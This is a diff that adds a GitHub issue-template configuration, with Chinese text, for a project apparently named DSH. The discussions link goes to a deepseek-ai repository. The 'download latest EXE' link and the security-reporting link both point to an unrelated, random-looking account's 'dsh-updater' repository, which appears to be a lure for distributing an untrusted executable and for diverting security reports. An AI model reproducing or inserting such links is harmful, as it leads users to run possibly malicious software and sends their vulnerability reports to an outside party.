@@ -1,0 +1,15 @@
+# 空白 issue 关掉：走模板能自动带上标签，也少一堆「就一句话」的帖子
+blank_issues_enabled: false
+
+contact_links:
+  - name: 💬 讨论 / 提问 / 展示（DSH 官方 Discussions）
+    url: https://github.com/deepseek-ai/deepseek-harness/discussions/9221
+    about: 用法交流、经验分享、不确定算不算 bug 的，都欢迎来这里聊。
+
+  - name: 📦 下载最新版（EXE / 源码版）
+    url: https://github.com/mutoharohfiqhiabcd-source/dsh-updater/releases/latest
+    about: 遇到问题先确认用的是不是最新版。
+
+  - name: 🔐 安全问题
+    url: https://github.com/mutoharohfiqhiabcd-source/dsh-updater/blob/main/SECURITY.md
+    about: 涉及安全的请按 SECURITY.md 里的方式私下反馈，不要开公开 issue。
